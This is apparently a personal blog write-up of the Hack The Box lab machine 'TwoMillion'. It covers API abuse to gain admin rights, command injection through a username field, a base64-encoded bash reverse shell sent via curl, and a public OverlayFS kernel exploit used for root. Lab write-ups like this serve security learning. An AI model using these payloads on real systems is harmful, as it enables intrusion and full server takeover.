---
title: 'HTB TwoMillion Writeup'
date: 2025-06-17
permalink: /posts/2025/06/HTB_TwoMillion_Writeup/
tags:
  - HTB
  - writeup
  - easy
---

A writeup of the Hack The Box machine "TwoMillion" with easy difficulty


HTB_TwoMillion
======

Hi and welcome to my writeup of the Hack The Box machine TwoMillion with Easy difficulty. This is my adventure of trying to pawn this machine.

<img src='/images/HTB_TwoMillion/afbeelding.png'>

Beginning with a Nmap scan (`nmap -sV -sV 10.10.11.221`) , we can see that there are 2 port open: 22 (SSH) and 80 (HTTP). Port 80 has a redirect to [`http://2million.htb/`](http://2million.htb/) .

Let’s see what this URL has to offer. But in order to do that we need to add the ip and domain to the `/etc/hosts` file. Like this: `10.10.11.221    2million.htb` 

All right, the webpage looks like a HTB website. There is a login page and an invite page. In the faq section of the homepage:  In order to join you should solve an entry-level challenge that is presented [here](http://2million.htb/invite). If you are unable to "hack the invite process" you will probably wont be able to do much after joining also. So this is the starting-point maybe.

<img src='/images/HTB_TwoMillion/afbeelding 1.png'>

Looking at the source code of this /invite page, there is a js file named `inviteapi.min.js`. This reminds me of the javascript deobfuscation technique, because the js file begins with `function (p, a, c, k, e, d)` .

After deobfuscation the code, this is what it looks like:

```jsx
function verifyInviteCode(code) {
  var formData = { "code": code };
  $.ajax({
    type: "POST",
    dataType: "json",
    data: formData,
    url: '/api/v1/invite/verify',
    success: function (response) {
      console.log(response)
    },
    error: function (response) {
      console.log(response)
    }
  });
}

function makeInviteCode() {
  $.ajax({
    type: "POST",
    dataType: "json",
    url: '/api/v1/invite/how/to/generate',
    success: function (response) {
      console.log(response)
    },
    error: function (response) {
      console.log(response)
    }
  });
}
```

Let’s try to curl this endpoint to see what it gives us back: `curl -X POST http://2million.htb/api/v1/invite/how/to/generate` 

<img src='/images/HTB_TwoMillion/afbeelding 2.png'>

Well, this gives away the next step, decrypt the encrypted string we got back. The encryption type is ROT13 as we can see in the response. Decoding this string reviews the next step: “In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate.”

Curling this URL gives us the following response: 

`{"0":200,"success":1,"data":{"code":"NlhOTVItNDgwNEYtTExESkMtWVNLMEU=","format":"encoded"}}` 

This immediately looks like base64 encoded. Decoding this string gives us the invite code.

Creating a account and logging in with it show us a HTB dashboard. 

Searching through this website looking for the next clue, on the Access tab under Labs: there is a Connection Pack button which leads to another api endpoint: [`http://2million.htb/api/v1/user/vpn/generate`](http://2million.htb/api/v1/user/vpn/generate) .

Curling this api gives us nothing back. We see /api/v1/user so maybe there is an admin we can reach. We can use a tools such as ffuf for the API endpoint discovery:

`ffuf -u http://2million.htb/api/v1/admin/FUZZ -w /home/kali/HTB/SecLists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,204,403,401`

This has no response sadly.

Maybe there are API-docs present somewhere: Nope, haven't found any.

After some time I got a list of all the api endpoints by just typing [http://2million.htb/api/v1](http://2million.htb/api/v1) in the browser.

There are a few (3) /api/v1/admin api endpoints present. 

<img src='/images/HTB_TwoMillion/afbeelding 3.png'>

Maybe we can update our user setting to become an admin? Or can we generate a VPN for the admin user?

Let’s try to curl the endpoints. All of them return a 401 Unauthorized. But we can see that the site is using PHP because of the PHPSESSID cookie token. Maybe adding this cookie to the curl command gets us further:

<img src='/images/HTB_TwoMillion/afbeelding 4.png'>

Oh yes this is something… now we get a invalid content type back. So we have access to the endpoint, but it expects a specific input.

What if we send the content header also: 

`curl -sv -X PUT http://2million.htb/api/v1/admin/settings/update -H "Content-Type: application/json" -H "Accept: application/json" --cookie "PHPSESSID=su2uouduqckqm3i3mkp57gin7o" | jq` 

Now we get a `“Missing parameter: email”` back. Let’s adjust the curl again:

`curl -sv -X PUT http://2million.htb/api/v1/admin/settings/update -H "Content-Type: application/json" -H "Accept: application/json" -d '{"email": "test@htb.local"}' --cookie "PHPSESSID=su2uouduqckqm3i3mkp57gin7o" | jq`

Response: `"message": "Missing parameter: is_admin”`. Let’s adjust again, this is also a hint that privilege escalation may be possible:

`curl -sv -X PUT http://2million.htb/api/v1/admin/settings/update -H "Content-Type: application/json" -H "Accept: application/json" -d '{"email": "victim@htb.local", "is_admin": true}' --cookie "PHPSESSID=su2uouduqckqm3i3mkp57gin7o" | jq`

Response: `"message": "Variable is_admin needs to be either 0 or 1.”` . Adjust again:

`curl -sv -X PUT http://2million.htb/api/v1/admin/settings/update -H "Content-Type: application/json" -H "Accept: application/json" -d '{"email": "victim@htb.local", "is_admin": 1}' --cookie "PHPSESSID=su2uouduqckqm3i3mkp57gin7o" | jq`

<img src='/images/HTB_TwoMillion/afbeelding 5.png'>

Now our user has become admin:

<img src='/images/HTB_TwoMillion/afbeelding 6.png'>

Let’s try to generate a VPN for our admin user:

`curl -sv -X POST http://2million.htb/api/v1/admin/vpn/generate -H "Content-Type: application/json" -d '{"username":"test"}' --cookie "PHPSESSID=su2uouduqckqm3i3mkp57gin7o"`

This gives us the VPN file for the test user, because we are an admin user.

We could try command injection in this curl command and see if that works:

`curl -sv -X POST http://2million.htb/api/v1/admin/vpn/generate -H "Content-Type: application/json" -d '{"username":"test;id;"}' --cookie "PHPSESSID=su2uouduqckqm3i3mkp57gin7o"`

And yes we got a `uid=33(www-data) gid=33(www-data) groups=33(www-data)` back. This means command execution is possible on the server side.

Let’s start an Netcat listener to catch a shell:

`nc -lvp 1234`

We can get this shell with this payload: `bash -i >& /dev/tcp/10.10.14.120/1234 0>&1`

But before we put this payload in the curl command, we need to encode the payload in base64:

`YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMjAvMTIzNCAwPiYx` and then decode it in the same command with `base64 -d` . Now the command looks like this:

`curl -sv -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie
"PHPSESSID=su2uouduqckqm3i3mkp57gin7o" --header "Content-Type: application/json" --data
'{"username":"test;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMjAvMTIzNCAwPiYx |
base64 -d | bash;"}'`

Andd yes we have a shell!

<img src='/images/HTB_TwoMillion/afbeelding 7.png'>

I found the flag in the /home/admin directory, but we need a password…

Searching through the directories I found a .env:

<img src='/images/HTB_TwoMillion/afbeelding 8.png'>

Let’s take a look:

<img src='/images/HTB_TwoMillion/afbeelding 9.png'>

Well, there it is.

I tried to SSH in the machine with password re-use in mind:

Yes that worked, now we can obtain the user flag.

# Privilege Escalation

After some enumeration on the system I found a mail in the `/var/mail` folder: 

<img src='/images/HTB_TwoMillion/afbeelding 10.png'>

This looks like a hint that the OS on the web host has a few serious Linux kernel CVEs in the OverlayFS / FUSE. Lets take a look at the kernel version of the OS: `uname -a` 

Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux

Next we search for the specific CVE for OverlayFS / FUSE:

I found this: [https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/](https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/) 

“A system is likely to be vulnerable if it has a kernel version lower than 6.2.” This looks promising.

Let’s search in the Metasploit database for available exploitations for this CVE-2023-0386.

<img src='/images/HTB_TwoMillion/afbeelding 11.png'>

We see 1 available: `exploit/linux/local/cve_2023_0386_overlayfs_priv_esc` . Let’s try this one:

`set LHOST 10.10.11.221` 

`set SESSSION 1` 

Hmm wait, for this you already need some kind of an active connection. Let’s try another options: https://github.com/puckiestyle/CVE-2023-0386

`git clone https://github.com/puckiestyle/CVE-2023-0386.git` 

Now, compress the repo: `zip -r cve.zip CVE-2023-0386`

Now, upload the zip file using scp:

`scp cve.zip admin@10.10.11.221:/tmp`

<img src='/images/HTB_TwoMillion/afbeelding 12.png'>

On the target machine, go to `/tmp` and unzip the file”

`cd /tmp` 

`unzip cve.zip`

Now go into the unzipped directory and follow the instructions of the GitHub page:

`cd /tmp/CVE-2023-0386/`

`make all` 

Start two terminals and enter in the first terminal: `./fuse ./ovlcap/lower ./gc` 

<img src='/images/HTB_TwoMillion/afbeelding 13.png'>

In the second terminal enter: `./exp`

<img src='/images/HTB_TwoMillion/afbeelding 14.png'>

The root flag is located in the `/root` directory.

<img src='/images/HTB_TwoMillion/afbeelding 15.png'>

<img src='/images/HTB_TwoMillion/afbeelding 16.png'>

Looking inside the thank_you.json file gives us a huge string of encoded data:

<img src='/images/HTB_TwoMillion/afbeelding 17.png'>

Let’s try to decode this huge string:

`echo '%7B%22encoding%22:%20%22hex%22,%20%22data%22:………..413d3d227d%22%7D' | python3 -c "import sys, urllib.parse, json; d=json.loads(urllib.parse.unquote(sys.stdin.read())); print(bytes.fromhex(d['data']).decode())”`

We get a base64 string out of this and it is encrypted with xor with the encryption key `HackTheBox` . First, we decode the base64 string with [https://www.urldecoder.org/](https://www.urldecoder.org/) :

```
{"encoding": "hex", "data": "7b22656e6372797074696f6e223a2022786f72222c2022656e6372707974696f6e5f6b6579223a2022…….786f4a4a6b385049415152446e514443793059464330464241353041525a69446873724242415950516f4a4a30384d4a304543427a6847623067344554774a517738784452556e4841786f4268454b494145524e7773645a477470507a774e52516f4f47794d3143773457427831694f78307044413d3d227d"}
```

Now it’s encoded in HEX, let’s decode it again:

```
{"encryption": "xor", "encrpytion_key": "HackTheBox", "encoding": "base64", "data": "DAQCGXQgBCEELCAEIQQsSCYtAhU9DwofLURvSDgdaAARDnQcDTAGFCQEB0sgB0UjARYnFA0IMUgEYgIXJQQNHzsdFmICESQEEB87BgBiBhZoDhYZdAIKNx0WLRhDHzsPADYHHTpPQzw9HA1iBhUlBA0YMUgPLRZYKQ8HSzMaBDYGDD0FBkd0HwBiDB0kBAEZNRwAYhsQLUECCDwBADQKFS0PF0s7DkUwChkrCQoFM0hXYgIRJA0KBDpIFycCGToKAgk4DUU3HB06EkJLAAAMMU8RJgIRDjABBy4KWC4EAh90Hwo3AxxoDwwfdAAENApYKgQGBXQYCjEcESoNBksjAREqAA08QQYKNwBFIwEcaAQVDiYRRS0BHWgOBUstBxBsZXIOEwwGdBwNJ08OLRMaSzYNAisBFiEPBEd0IAQhBCwgBCEELEgNIxxYKgQGBXQKECsDDGgUEwQ6SBEqClgqBA8CMQ5FNgcZPEEIBTsfCScLHy1BEAM1GgwsCFRoAgwHOAkHLR0ZPAgMBXhIBCwLWCAADQ8nRQosTx0wEQYZPQ0LIQpYKRMGSzIdCyYOFS0PFwo4SBEtTwgtExAEOgkJYg4WLEETGTsOADEcEScPAgd0DxctGAwgT0M/Ow8ANgcdOk1DHDFIDSMZHWgHDBggDRcnC1gpD0MOOh4MMAAWJQQNH3QfDScdHWgIDQU7HgQ2BhcmQRcDJgETJxxYKQ8HSycDDC4DC2gAEQ50AAosChxmQSYKNwBFIQcZJA0GBTMNRSEAFTgNBh8xDEliChkrCUMGNQsNKwEdaAIMBSUdADAKHGRBAgUwSAA0CgoxQRAAPQQJYgMdKRMNDjBIDSMcWCsODR8mAQc3Gx0sQRcEdBwNJ08bJw0PDjccDDQKWCEPFw44BAwlChYrBEMfPAkRYgkNLQ0QSyAADDFPDiEDEQo6HEUhABUlFA0CIBFLSGUsJ0EGCjcARSMBHGgEFQ4mEUUvChUqBBFLOw5FNgcdaCkCCD88DSctFzBBAAQ5BRAsBgwxTUMfPAkLKU8BJxRDDTsaRSAKESYGQwp0GAQwG1gnB0MfPAEWYgYWKxMGDz0KCSdPEicUEQUxEUtiNhc9E0MIOwYRMAYaPRUKBDobRSoODi1BEAM1GAAmTwwgBEMdMRocYgkZKhMKCHQHA2IADTpBEwc1HAMtHRVoAA0PdAELMR8ROgQHSyEbRTYAWCsODR89BhAjAxQxQQoFOgcTIxsdaAAND3QNEy0DDi1PQzwxSAQwClghDA4OOhsALhZYOBMMHjBICiRPDyAAF0sjDUUqDg4tQQIINwcIMgMROwkGD3QcCiUKDCAEEUd0CQsmTw8tQQYKMw0XLhZYKQ8XAjcBFSMbHWgVCw50Cwo3AQwkBBAYdAUMLgoLPA4NDidIHCcbWDwOQwg7BQBsZXIABBEOcxtFNgBYPAkGSzoNHTZPGyAAEx8xGkliGBAtEwZLIw1FNQYUJEEABDocDCwaHWgVDEskHRYqTwwgBEMJOx0LJg4KIQQQSzsORSEWGi0TEA43HRcrGwFkQQoFJxgMMApYPAkGSzoNHTZPHy0PBhk1HAwtAVgnB0MOIAAMIQ4UaAkCCD8NFzFDWCkPB0s3GgAjGx1oAEMcOxoJJk8PIAQRDnQDCy0YFC0FBA50ARZiDhsrBBAYPQoJJ08MJ0ECBzhGb0g4ETwJQw8xDRUnHAxoBhEKIAERNwsdZGtpPzwNRQoOGyM1Cw4WBx1iOx0pDA=="}The quick brown 🦊 jumps over 13 lazy 🐶.
```

Now it’s both base64 encoded and XORed with the key HackTheBox. We can use CyberChef for this:

<img src='/images/HTB_TwoMillion/afbeelding 18.png'>

Using the settings in the image gives us the right output message:

```
Dear HackTheBox Community,

We are thrilled to announce a momentous milestone in our journey together. With immense joy and gratitude, we celebrate the achievement of reaching 2 million remarkable users! This incredible feat would not have been possible without each and every one of you.

From the very beginning, HackTheBox has been built upon the belief that knowledge sharing, collaboration, and hands-on experience are fundamental to personal and professional growth. Together, we have fostered an environment where innovation thrives and skills are honed. Each challenge completed, each machine conquered, and every skill learned has contributed to the collective intelligence that fuels this vibrant community.

To each and every member of the HackTheBox community, thank you for being a part of this incredible journey. Your contributions have shaped the very fabric of our platform and inspired us to continually innovate and evolve. We are immensely proud of what we have accomplished together, and we eagerly anticipate the countless milestones yet to come.

Here's to the next chapter, where we will continue to push the boundaries of cybersecurity, inspire the next generation of ethical hackers, and create a world where knowledge is accessible to all.

With deepest gratitude,

The HackTheBox Team
```

Ah that’s a nice message!

# Conclusion

Well, I found this machine pretty challenging for me as a beginner in this field. At some points I got stuck and consulted the official writeup which got me going again. Tank you for reading this writeup and until the next one!
